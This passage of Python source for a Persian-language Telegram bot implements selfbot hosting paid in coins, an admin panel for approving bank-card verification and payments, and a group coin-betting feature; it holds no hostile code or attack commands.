        elif data == "admin_verifications":
            verifications = db.get_pending_verifications()
            if not verifications:
                await callback_query.message.edit_text("❌ هیچ درخواست احراز در انتظاری وجود ندارد.")
                return
            
            text = "🔐 **درخواست‌های احراز هویت:**\n\n"
            for uid, info in list(verifications.items())[:10]:
                name = info.get('first_name', 'ناشناس')
                text += f"👤 {name} → `{uid}`\n"
            
            if len(verifications) > 10:
                text += f"\n... و {len(verifications) - 10} درخواست دیگر"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
            ])
            await callback_query.message.edit_text(text, reply_markup=keyboard)
            await callback_query.answer()
        
        # ====== درخواست‌های پرداخت ======
        elif data == "admin_payments":
            payments = db.get_pending_payments()
            if not payments:
                await callback_query.message.edit_text("❌ هیچ درخواست پرداخت در انتظاری وجود ندارد.")
                return
            
            text = "💳 **درخواست‌های پرداخت:**\n\n"
            for uid, info in list(payments.items())[:10]:
                name = info.get('first_name', 'ناشناس')
                coins = info.get('coins', 0)
                text += f"👤 {name} → `{uid}` | {coins} سکه\n"
            
            if len(payments) > 10:
                text += f"\n... و {len(payments) - 10} درخواست دیگر"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_back")]
            ])
            await callback_query.message.edit_text(text, reply_markup=keyboard)
            await callback_query.answer()
        
        # ====== بازگشت به پنل ادمین ======
        elif data == "admin_back":
            await admin_panel(client, callback_query.message)
            await callback_query.answer()
        
        # ====== تنظیم سکه (از دکمه) ======
        elif data.startswith("set_"):
            target_id = int(data.split("_")[1])
            db.set("temp_data", f"admin_set_{user_id}", target_id)
            await callback_query.message.edit_text(
                f"💰 **تعداد سکه جدید برای کاربر {target_id} را وارد کنید:**",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 انصراف", callback_data="admin_back")]
                ])
            )
            await callback_query.answer()
        
        # ====== توقف سلف (از دکمه) ======
        elif data.startswith("stop_"):
            target_id = int(data.split("_")[1])
            if stop_selfbot(target_id):
                await callback_query.message.edit_text(f"✅ سلف‌بات کاربر {target_id} متوقف شد.")
            else:
                await callback_query.message.edit_text(f"ℹ️ سلف‌بات کاربر {target_id} از قبل متوقف بود.")
            await callback_query.answer()
        
        # ====== تایید احراز ======
        elif data.startswith("verify_approve_"):
            target_id = int(data.split("_")[2])
            user_data = db.get("users", target_id, {})
            user_data["verified"] = True
            user_data["rejected"] = False
            db.set("users", target_id, user_data)
            db.delete("verifications", target_id)
            
            await callback_query.message.edit_text(f"✅ احراز هویت کاربر {target_id} تایید شد.")
            try:
                await bot.send_message(
                    target_id,
                    "✅ **احراز هویت شما تایید شد!**\n\n"
                    "اکنون می‌توانید از بخش «افزایش موجودی» استفاده کنید."
                )
            except:
                pass
            await callback_query.answer()
        
        # ====== رد احراز ======
        elif data.startswith("verify_reject_"):
            target_id = int(data.split("_")[2])
            user_data = db.get("users", target_id, {})
            user_data["verified"] = False
            user_data["rejected"] = True
            db.set("users", target_id, user_data)
            db.delete("verifications", target_id)
            
            await callback_query.message.edit_text(f"❌ احراز هویت کاربر {target_id} رد شد.")
            try:
                await bot.send_message(
                    target_id,
                    "❌ **احراز هویت شما رد شد!**\n\n"
                    "لطفا مجدداً با ارسال عکس واضح‌تر اقدام کنید."
                )
            except:
                pass
            await callback_query.answer()
        
        # ====== تایید پرداخت ======
        elif data.startswith("payment_approve_"):
            target_id = int(data.split("_")[2])
            payment_data = db.get("payments", target_id)
            if payment_data:
                coins = payment_data.get("coins", 0)
                current = db.get("credits", target_id, 0)
                db.set("credits", target_id, current + coins)
                payment_data["status"] = "approved"
                db.set("payments", target_id, payment_data)
                
                await callback_query.message.edit_text(
                    f"✅ پرداخت کاربر {target_id} تایید شد.\n"
                    f"💰 {coins} سکه به حسابش اضافه شد."
                )
                try:
                    await bot.send_message(
                        target_id,
                        f"✅ **پرداخت شما تایید شد!**\n\n"
                        f"💰 {coins} سکه به حساب شما اضافه شد.\n"
                        f"📊 موجودی جدید: {db.get('credits', target_id, 0)} سکه"
                    )
                except:
                    pass
            else:
                await callback_query.message.edit_text(f"❌ اطلاعات پرداخت کاربر {target_id} یافت نشد.")
            await callback_query.answer()
        
        # ====== رد پرداخت ======
        elif data.startswith("payment_reject_"):
            target_id = int(data.split("_")[2])
            payment_data = db.get("payments", target_id)
            if payment_data:
                payment_data["status"] = "rejected"
                db.set("payments", target_id, payment_data)
                
                await callback_query.message.edit_text(f"❌ پرداخت کاربر {target_id} رد شد.")
                try:
                    await bot.send_message(
                        target_id,
                        "❌ **پرداخت شما رد شد!**\n\n"
                        "لطفا مجدداً با ارسال رسید واضح‌تر اقدام کنید."
                    )
                except:
                    pass
            else:
                await callback_query.message.edit_text(f"❌ اطلاعات پرداخت کاربر {target_id} یافت نشد.")
            await callback_query.answer()
            
    @bot.on_message(filters.command("set") & filters.user(ADMIN_ID))
    async def set_credits(client, message: Message):
        if len(message.command) != 3:
            await message.reply_text("❌ فرمت: `/set آیدی تعداد`")
            return
        
        try:
            target_id = int(message.command[1])
            amount = int(message.command[2])
            db.set("credits", target_id, amount)
            
            await message.reply_text(f"✅ سکه کاربر {target_id} تنظیم شد به {amount}")
            
            try:
                await bot.send_message(target_id, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
            except: 
                pass
            
        except: 
            await message.reply_text("❌ آیدی/تعداد باید عدد باشد")
    
    @bot.on_message(filters.command("user") & filters.user(ADMIN_ID))
    async def user_info(client, message: Message):
        if len(message.command) != 2:
            await message.reply_text("❌ فرمت: `/user آیدی`")
            return
        
        try:
            target_id = int(message.command[1])
            user_data = db.get("users", target_id, {})
            credits = db.get("credits", target_id, 0)
            process = db.get("processes", target_id)
            timer = db.get("timers", target_id)
            
            if not user_data:
                await message.reply_text("❌ کاربر یافت نشد")
                return
            
            status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
            phone = user_data.get('phone', '❌ ثبت نشده')
            created = time.ctime(user_data.get('created_at', time.time()))
            running = "🟢 بله" if process else "🔴 خیر"
            has_timer = "🟢 فعال" if timer and timer.get('is_running') else "🔴 غیرفعال"
            verified_status = "✅ تایید شده" if user_data.get('verified') else "❌ تایید نشده"
            rejected_status = "❌ رد شده" if user_data.get('rejected') else "✅ فعال"
            
            created_time = user_data.get('created_at', time.time())
            time_diff = time.time() - created_time
            days = int(time_diff // 86400)
            hours = int((time_diff % 86400) // 3600)
            
            info_text = f"""
    👤 **اطلاعات کاربر {target_id}**
    
    📱 **شماره:** `{phone}`
    📊 **وضعیت:** {status}
    🔐 **احراز هویت:** {verified_status}
    🚫 **وضعیت رد:** {rejected_status}
    💰 **سکه ها:** `{credits}`
    🔄 **سلف:** {running}
    📅 **تاریخ ایجاد:** `{created}`
    ⏳ **عضو شده:** {days} روز و {hours} ساعت
    
    ⏱ **زمان باقی‌مانده:** `{credits}` ساعت
    💸 **مصرف سکه:** 1 سکه در ساعت
    """
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎯 تنظیم سکه", callback_data=f"set_{target_id}"),
                 InlineKeyboardButton("🛑 توقف سلف", callback_data=f"stop_{target_id}")],
                [InlineKeyboardButton("✅ تایید احراز", callback_data=f"verify_approve_{target_id}"),
                 InlineKeyboardButton("❌ رد احراز", callback_data=f"verify_reject_{target_id}")]
            ])
            
            await message.reply_text(info_text, reply_markup=keyboard)
            
        except: 
            await message.reply_text("❌ آیدی باید عدد باشد")
    
    @bot.on_message(filters.command("admin") & filters.user(ADMIN_ID))
    async def admin_panel(client, message: Message):
        users = db.data.get("users", {})
        active_count = len(db.data.get("processes", {}))
        total_credits = sum(db.data.get("credits", {}).values())
        verified_users = len(db.get_verified_users())
        pending_verifications = len(db.get_pending_verifications())
        pending_payments = len(db.get_pending_payments())
        
        today = time.time() - 86400
        new_today = sum(1 for user_data in users.values() if user_data.get('created_at', 0) > today)
        
        stats_text = f"""
    🛠 **پنل مدیریت ادمین**
    
    👥 **کل کاربران:** `{len(users)}`
    🟢 **کاربران فعال:** `{active_count}`
    ✅ **کاربران تایید شده:** `{verified_users}`
    🆕 **کاربران امروز:** `{new_today}`
    💰 **مجموع سکه ها:** `{total_credits}`
    
    📋 **درخواست‌های در انتظار:**
    ├─ 🔐 احراز هویت: `{pending_verifications}`
    └─ 💰 پرداخت: `{pending_payments}`
    
    **📋 دستورات سریع:**
    `/set آیدی تعداد` - تنظیم سکه
    `/user آیدی` - اطلاعات کاربر
    `/admin` - این پنل
    """
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list"),
             InlineKeyboardButton("📊 آمار کامل", callback_data="admin_stats")],
            [InlineKeyboardButton("💰 برترین کاربران", callback_data="admin_top"),
             InlineKeyboardButton("🛑 توقف همه", callback_data="admin_stop_all")],
            [InlineKeyboardButton("🔐 درخواست احراز", callback_data="admin_verifications"),
             InlineKeyboardButton("💳 درخواست پرداخت", callback_data="admin_payments")]
        ])
        
        await message.reply_text(stats_text, reply_markup=keyboard)
    @bot.on_callback_query()
    async def callback_handler(client, callback_query):
        user_id = callback_query.from_user.id
        data = callback_query.data
        
        if data.startswith("joinbet_"):
            if data == "joinbet_waiting":
                await callback_query.answer("⏳ لطفا چند لحظه صبر کنید...", show_alert=True)
                return
            await join_group_bet_handler(client, callback_query)
            return
        
        if data.startswith("cancelbet_"):
            if data == "cancelbet_waiting":
                await callback_query.answer("⏳ لطفا چند لحظه صبر کنید...", show_alert=True)
                return
            await cancel_group_bet_handler(client, callback_query)
            return
        if data.startswith(("admin_", "set_", "stop_", "verify_", "payment_")):
            if user_id != ADMIN_ID:
                await callback_query.answer("❌ دسترسی غیرمجاز!", show_alert=True)
                return
            await admin_callback_handler(client, callback_query)
            return
        if data == "login":
            credits = db.get("credits", user_id, 0)
            if credits <= 0:
                await callback_query.message.edit_text(
                    f"❌ **سکه کافی ندارید!**\n\n💰 سکه های شما: `{credits}`\n\n💡 برای دریافت سکه با پشتیبانی تماس بگیرید.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
                )
                return
                
            await callback_query.message.edit_text(
                "📱 **لطفا شماره تلفن خود را ارسال کنید:**\n\n"
                "**فرمت:** +989123456789\n\n"
                "⚠️ شماره باید با کد کشور شروع شود",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
            )
            await callback_query.answer()
        
        elif data == "login_again":
            await callback_query.message.edit_text(
                "📱 **لطفا شماره تلفن جدید خود را ارسال کنید:**\n\n"
                "**فرمت:** +989123456789\n\n"
                "⚠️ شماره باید با کد کشور شروع شود",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
            )
            await callback_query.answer()
        elif data == "status_credits":
            user_data = db.get("users", user_id, {})
            credits = db.get("credits", user_id, 0)
            
            if not user_data:
                text = "❌ **شما هیچ سلف باتی ندارید**\n\nابتدا باید لاگین کنید و سلف بات را فعال کنید."
            elif user_data.get('status') == 'active':
                text = (
                    f"🟢 **سلف بات فعال**\n\n"
                    f"📱 **شماره:** `{user_data.get('phone', '')}`\n"
                    f"💰 **سکه باقی‌مانده:** `{credits}`\n"
                    f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
                    f"⏱ **مصرف:** 1 سکه در ساعت"
                )
            else:
                text = (
                    f"🔴 **سلف بات غیرفعال**\n\n"
                    f"📱 **شماره:** `{user_data.get('phone', '')}`\n"
                    f"💰 **سکه های شما:** `{credits}`\n\n"
                    f"💡 برای فعال کردن سلف بات روی 'فعالسازی' کلیک کنید."
                )
            
            await callback_query.message.edit_text(
                text,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
            )
            await callback_query.answer()
        elif data == "bet":
            await betting_info_handler(client, callback_query.message)
            await callback_query.answer()
        elif data == "self_management":
            user_data = db.get("users", user_id, {})
            credits = db.get("credits", user_id, 0)
            
            is_active = user_data.get('status') == 'active'
            process = db.get("processes", user_id)
            status_text = "🟢 **فعال**" if is_active and process else "🔴 **غیرفعال**"
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("▶️ روشن کردن سلف", callback_data="self_start"),
                    InlineKeyboardButton("⏹ خاموش کردن سلف", callback_data="self_stop")
                ],
                [
                    InlineKeyboardButton("🔄 آپدیت سلف", callback_data="self_update")
                ],
                [
                    InlineKeyboardButton("🔙 بازگشت", callback_data="back")
                ]
            ])
            
            await callback_query.message.edit_text(
                f"⚙️ **مدیریت سلف بات**\n\n"
                f"📊 **وضعیت فعلی:** {status_text}\n"
                f"💰 **سکه ها:** `{credits}`\n\n"
                f"🔹 **روشن کردن:** سلف بات را فعال می‌کند\n"
                f"🔹 **خاموش کردن:** سلف بات را متوقف می‌کند\n"
                f"🔹 **آپدیت سلف:** سلف بات را مجدداً راه‌اندازی می‌کند\n\n"
                f"📱 **شماره:** `{user_data.get('phone', 'ثبت نشده')}`",
                reply_markup=keyboard
            )
            await callback_query.answer()
        elif data == "self_start":
            user_data = db.get("users", user_id, {})
            credits = db.get("credits", user_id, 0)
            
            if credits <= 0:
                await callback_query.message.edit_text(
                    "❌ **سکه کافی ندارید!**\n\n"
                    f"💰 سکه های شما: `{credits}`\n\n"
                    "💡 لطفا ابتدا موجودی خود را افزایش دهید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💰 افزایش موجودی", callback_data="increase_balance")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
                return
            
            if not user_data.get('phone'):
                await callback_query.message.edit_text(
                    "❌ **شماره تلفن ثبت نشده است!**\n\n"
                    "لطفا ابتدا از طریق دکمه «فعالسازی» شماره خود را ثبت کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("● فعالسازی ●", callback_data="login")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
                return
            
            if db.get("processes", user_id):
                await callback_query.message.edit_text(
                    "ℹ️ **سلف بات در حال حاضر فعال است!**\n\n"
                    "برای راه‌اندازی مجدد از گزینه «آپدیت سلف» استفاده کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 آپدیت سلف", callback_data="self_update")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
                return
            
            if run_selfbot(user_id, user_data.get('phone')):
                credits = db.get("credits", user_id, 0)
                await callback_query.message.edit_text(
                    f"✅ **سلف بات با موفقیت روشن شد!**\n\n"
                    f"💰 **سکه باقی‌مانده:** `{credits}`\n"
                    f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
                    f"📱 **شماره:** `{user_data.get('phone')}`",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management")]
                    ])
                )
            else:
                await callback_query.message.edit_text(
                    "❌ **خطا در روشن کردن سلف بات!**\n\n"
                    "لطفا دوباره تلاش کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 تلاش مجدد", callback_data="self_start")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
            await callback_query.answer()
        elif data == "self_stop":
            if stop_selfbot(user_id):
                await callback_query.message.edit_text(
                    "✅ **سلف بات با موفقیت خاموش شد!**\n\n"
                    "برای روشن کردن مجدد از گزینه «روشن کردن سلف» استفاده کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("▶️ روشن کردن سلف", callback_data="self_start")],
                        [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management")]
                    ])
                )
            else:
                await callback_query.message.edit_text(
                    "ℹ️ **سلف بات در حال حاضر خاموش است!**\n\n"
                    "برای روشن کردن از گزینه «روشن کردن سلف» استفاده کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("▶️ روشن کردن سلف", callback_data="self_start")],
                        [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management")]
                    ])
                )
            await callback_query.answer()
        elif data == "self_update":
            user_data = db.get("users", user_id, {})
            credits = db.get("credits", user_id, 0)
            
            if credits <= 0:
                await callback_query.message.edit_text(
                    "❌ **سکه کافی ندارید!**\n\n"
                    f"💰 سکه های شما: `{credits}`\n\n"
                    "💡 لطفا ابتدا موجودی خود را افزایش دهید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💰 افزایش موجودی", callback_data="increase_balance")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
                return
            
            if not user_data.get('phone'):
                await callback_query.message.edit_text(
                    "❌ **شماره تلفن ثبت نشده است!**\n\n"
                    "لطفا ابتدا از طریق دکمه «فعالسازی» شماره خود را ثبت کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("● فعالسازی ●", callback_data="login")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
                return
            
            await callback_query.message.edit_text(
                "🔄 **در حال آپدیت سلف بات...**\n\n"
                "لطفا چند لحظه صبر کنید...",
                reply_markup=None
            )
            
            stop_selfbot(user_id)
            await asyncio.sleep(1)
            
            if run_selfbot(user_id, user_data.get('phone')):
                credits = db.get("credits", user_id, 0)
                await callback_query.message.edit_text(
                    f"✅ **سلف بات با موفقیت آپدیت شد!**\n\n"
                    f"💰 **سکه باقی‌مانده:** `{credits}`\n"
                    f"⏰ **زمان باقی‌مانده:** `{credits}` ساعت\n\n"
                    f"📱 **شماره:** `{user_data.get('phone')}`",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 بازگشت به مدیریت", callback_data="self_management")]
                    ])
                )
            else:
                await callback_query.message.edit_text(
                    "❌ **خطا در آپدیت سلف بات!**\n\n"
                    "لطفا دوباره تلاش کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 تلاش مجدد", callback_data="self_update")],
                        [InlineKeyboardButton("🔙 بازگشت", callback_data="self_management")]
                    ])
                )
            await callback_query.answer()
        
        elif data == "increase_balance":
            user_data = db.get("users", user_id, {})
            
            if user_data.get('rejected'):
                await callback_query.answer("❌ حساب شما توسط ادمین رد شده است. امکان افزایش موجودی ندارید.", show_alert=True)
                return
            
            if not user_data.get('verified'):
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("● احراز هویت ●", callback_data="start_verification")],
                    [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
                ])
                
                await callback_query.message.edit_text(
                    "🔒 **برای افزایش موجودی نیاز به احراز هویت دارید**\n\n"
                    "📋 **مراحل احراز هویت:**\n"
                    "1️⃣ کلیک روی دکمه 'احراز هویت'\n"
                    "2️⃣ ارسال عکس از کارت بانکی\n"
                    "3️⃣ تایید توسط ادمین\n"
                    "4️⃣ افزایش موجودی\n\n"
                    "⚠️ **توجه:** اطلاعات حساس (CVV2، تاریخ انقضا) در عکس پوشیده شود",
                    reply_markup=keyboard
                )
                return
            else:
                await callback_query.message.edit_text(
                    "💰 **افزایش موجودی**\n\n"
                    f"💎 **نرخ تبدیل:** هر {COIN_RATE} سکه = 50,000 تومان\n"
                    f"💵 **قیمت هر سکه:** {TOMAN_PER_COIN:.0f} تومان\n\n"
                    "🔢 **تعداد سکه مورد نظر خود را وارد کنید:**\n"
                    "مثال: 1440\n\n"
                    "💡 **توجه:** فقط عدد وارد کنید (بدون نقطه یا کاما)",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
                )
                
                db.delete("temp_data", f"waiting_coins_{user_id}")
                db.set("temp_data", f"waiting_coins_{user_id}", True)
                await callback_query.answer("✅ لطفا تعداد سکه مورد نظر را وارد کنید")
    
        elif data == "start_verification":
            user_data = db.get("users", user_id, {})
            if user_data.get('rejected'):
                await callback_query.answer("❌ حساب شما توسط ادمین رد شده است.", show_alert=True)
                return
            
            await callback_query.message.edit_text(
                "📸 **لطفا عکس کارت بانکی خود را ارسال کنید**\n\n"
                "⚠️ **قبل از ارسال مطمئن شوید:**\n"
                "• نام صاحب کارت مشخص باشد\n"
                "• شماره کارت واضح باشد\n"
                "• CVV2 ❌ پوشیده شود\n"
                "• تاریخ انقضا ❌ پوشیده شود\n\n"
                "📎 یک عکس با کیفیت مناسب ارسال کنید",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="increase_balance")]])
            )
            db.set("temp_data", f"waiting_card_photo_{user_id}", True)
       
        elif data == "back":
            if user_id != ADMIN_ID:
                credits = db.get("credits", user_id, 0)
                user_data = db.get("users", user_id, {})
                
                status_text = "🔴 سلف غیرفعال"
                phone_text = ""
                verified_status = "❌ احراز نشده"
                
                if user_data and user_data.get('status') == 'active':
                    status_text = f"🟢 سلف فعال"
                    phone_text = f"\n📱 شماره: {user_data.get('phone', '')}"
                
                if user_data.get('verified'):
                    verified_status = "✅ احراز شده"
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("● فعالسازی ●", callback_data="login")],
                    [
                        InlineKeyboardButton("● حساب کاربری ●", callback_data="status_credits"),
                        InlineKeyboardButton("● شرطبندی ●", callback_data="bet")
                    ],
                    [
                        InlineKeyboardButton("● مدیریت سلف ●", callback_data="self_management"),
                        InlineKeyboardButton("● افزایش موجودی ●", callback_data="increase_balance")
                    ]
                ])
                
                text = f"🤖 **ربات مدیریت سلف بات**\n\n**وضعیت:** {status_text}{phone_text}\n**🔐 احراز:** {verified_status}\n**💰 سکه ها:** `{credits}` سکه\n**⏰ مصرف:** 1 سکه در ساعت"
                
                await callback_query.message.edit_text(text, reply_markup=keyboard)
            else:
                await admin_panel(client, callback_query.message)
            await callback_query.answer()
        
        elif data == "check_join":
            ok, not_joined = await check_force_join(client, user_id)
            if ok:
                await callback_query.message.edit_text("✅ عضویت شما در همه کانال‌ها تایید شد!\nدوباره /start بزنید.")
                return
            buttons = []
            for ch in not_joined:
                buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
            buttons.append([InlineKeyboardButton("🔄 بررسی مجدد", callback_data="check_join")])
            await callback_query.message.edit_text(
                "❌ هنوز عضو همه کانال‌ها نیستید!",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            await callback_query.answer()
    @bot.on_message(filters.user(ADMIN_ID) & filters.regex(r'^\d+$'))
    async def handle_admin_input(client, message: Message):
        user_id = message.from_user.id
        amount = int(message.text)
        
        set_target = db.get("temp_data", f"admin_set_{user_id}")
        if set_target:
            db.delete("temp_data", f"admin_set_{user_id}")
            db.set("credits", set_target, amount)
            
            await message.reply_text(f"✅ سکه کاربر {set_target} تنظیم شد به {amount}")
            
            try:
                await bot.send_message(set_target, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
            except: pass
    @bot.on_message(filters.command("start"))
    async def start_handler(client, message: Message):
        ok, not_joined = await check_force_join(client, message.from_user.id)
        if not ok:
            buttons = []
            for ch in not_joined:
                buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
            buttons.append([InlineKeyboardButton("● بررسی عضویت ●", callback_data="check_join")])
            await message.reply_text(
                "❌ برای استفاده از ربات باید در تمام کانال‌های زیر عضو شوید:",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return
    
        user_id = message.from_user.id
        
        existing_user = db.get("users", user_id)
        is_new_user = False
        
        if not existing_user:
            user_info = {
                "status": "inactive",
                "created_at": time.time(),
                "first_name": message.from_user.first_name or "",
                "username": message.from_user.username or "",
                "verified": False,
                "rejected": False
            }
            db.set("users", user_id, user_info)
            is_new_user = True
        else:
            user_info = existing_user
            user_info["first_name"] = message.from_user.first_name or ""
            user_info["username"] = message.from_user.username or ""
            db.set("users", user_id, user_info)
        
        credits = db.get("credits", user_id, 0)
        if is_new_user and credits == 0:
            db.set("credits", user_id, 5)
            credits = 5
        
        if user_id == ADMIN_ID:
            await admin_panel(client, message)
            return
        
        user_data = db.get("users", user_id, {})
        status = "🟢 فعال" if user_data.get('status') == 'active' else "🔴 غیرفعال"
        phone = user_data.get('phone', '')
        verified_status = "✅ احراز شده" if user_data.get('verified') else "❌ احراز نشده"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("● فعالسازی ●", callback_data="login")],
            [
                InlineKeyboardButton("● حساب کاربری ●", callback_data="status_credits"),
                InlineKeyboardButton("● شرطبندی ●", callback_data="bet")
            ],
            [
                InlineKeyboardButton("● مدیریت سلف ●", callback_data="self_management"),  
                InlineKeyboardButton("● افزایش موجودی ●", callback_data="increase_balance")
            ]
        ])
        
        welcome_text = f"""**🌺 به ربات سلف ساز خوش آمدید!**
    
    🤖 **ربات مدیریت سلف بات حرفه‌ای**
    ├─ ساخت سلف شخصی
    📊 **وضعیت حساب شما:**
    ├─ 👤 کاربر: {message.from_user.first_name or "ناشناس"}
    ├─ 🔋 وضعیت: {status}
    ├─ 🔐 وضعیت احراز: {verified_status}
    ├─ 💰 سکه: {credits} عدد
    └─ ⏰ مصرف 1 سکه در ساعت
    
    {f"📱 **شماره:** `{phone}`" if phone else "⚠️ **شماره ثبت نشده**"}
    
    💡 برای شروع روی «فعالسازی» کلیک کنید."""
    
        await message.reply_text(welcome_text, reply_markup=keyboard)
    @bot.on_callback_query(filters.regex(r'^joinbet_(-?\d+)_(-?\d+)$'))
    async def join_group_bet_handler(client, callback_query):
        user_id = callback_query.from_user.id
        user_first_name = html.escape(callback_query.from_user.first_name or 'کاربر')
        user_mention = f'<a href="tg://user?id={user_id}"><b>{user_first_name}</b></a>'
        data = callback_query.data
        _, chat_id_str, msg_id_str = data.split('_')
    
        chat_id = int(chat_id_str)
        message_id = int(msg_id_str)
        bet_key = f"{chat_id}_{message_id}"
    
        bet_data = db.get("group_bets", bet_key)
        if not bet_data or not bet_data.get("is_active"):
            await callback_query.answer("❌ این شرط دیگر فعال نیست.", show_alert=True)
            return
    
        if bet_data.get("finished"):
            await callback_query.answer("❌ این شرط قبلا به پایان رسیده است.", show_alert=True)
            return
        if callback_query.message.chat.id != chat_id:
            await callback_query.answer("❌ این دکمه مخصوص گروه اصلی شرط است.", show_alert=True)
            return
    
        creator_id = bet_data["creator_id"]
        creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
        creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
        participants = bet_data.get("participants", [])
        if user_id == creator_id:
            await callback_query.answer("ℹ️ شما سازنده این شرط هستید و قبلاً داخل شرط هستید.", show_alert=True)
            return
        if len(participants) >= 1:
            await callback_query.answer("⛔ ظرفیت این شرط تکمیل شده است.", show_alert=True)
            return
    
        if user_id in [p["id"] for p in participants]:
            await callback_query.answer("ℹ️ شما قبلا در این شرط شرکت کرده‌اید.", show_alert=True)
            return
    
        amount = bet_data["amount"]
        current_credits = db.get("credits", user_id, 0)
    
        if current_credits < amount:
            await callback_query.answer(
                f"❌ سکه کافی ندارید!\n💰 موجودی شما: {current_credits} سکه",
                show_alert=True
            )
            return
        db.set("credits", user_id, current_credits - amount)
    
        participants.append({
            "id": user_id,
            "name": callback_query.from_user.first_name or "",
            "username": callback_query.from_user.username or ""
        })
        bet_data["participants"] = participants
        if not bet_data.get("timer_started"):
            bet_data["timer_started"] = True
            db.set("group_bets", bet_key, bet_data)
            asyncio.create_task(finish_group_bet(client, bet_key))
        else:
            db.set("group_bets", bet_key, bet_data)
        try:
            participants_mentions = []
            for p in participants:
                p_name = html.escape(p.get('name', 'کاربر'))
                participants_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
            
            all_players_mentions = [creator_mention] + participants_mentions
            
            new_text = (
                "🎲 شرط 1v1 در حال اجرا\n\n"
                f"💰 مبلغ هر نفر: <code>{amount}</code> سکه\n"
                f"👥 شرکت‌کننده‌ها: <code>{len(participants) + 1}/2</code> نفر\n"
                f"👤 بازیکنان: {', '.join(all_players_mentions)}\n\n"
                "⏳ ۵ ثانیه بعد بین این دو نفر قرعه‌کشی می‌شود."
            )
            new_keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ پیوستن به شرط", callback_data=f"joinbet_{chat_id}_{message_id}"),
                    InlineKeyboardButton("⛔ لغو شرط", callback_data=f"cancelbet_{chat_id}_{message_id}")
                ]
            ])
            await callback_query.message.edit_text(new_text, reply_markup=new_keyboard, parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            print(f"Error updating bet message: {e}")
    
        await callback_query.answer("✅ در شرط شرکت کردید و سکه از حساب شما کسر شد.")
    @bot.on_callback_query(filters.regex(r'^cancelbet_(-?\d+)_(-?\d+)$'))
    async def cancel_group_bet_handler(client, callback_query):
        user_id = callback_query.from_user.id
        user_first_name = html.escape(callback_query.from_user.first_name or 'کاربر')
        user_mention = f'<a href="tg://user?id={user_id}"><b>{user_first_name}</b></a>'
        data = callback_query.data
        _, chat_id_str, msg_id_str = data.split('_')
    
        chat_id = int(chat_id_str)
        message_id = int(msg_id_str)
        bet_key = f"{chat_id}_{message_id}"
    
        bet_data = db.get("group_bets", bet_key)
        if not bet_data:
            await callback_query.answer("❌ این شرط یافت نشد یا قبلا حذف شده.", show_alert=True)
            return
    
        creator_id = bet_data["creator_id"]
        creator_first_name = html.escape(bet_data.get('creator_name', 'کاربر'))
        creator_mention = f'<a href="tg://user?id={creator_id}"><b>{creator_first_name}</b></a>'
    
        if user_id != creator_id:
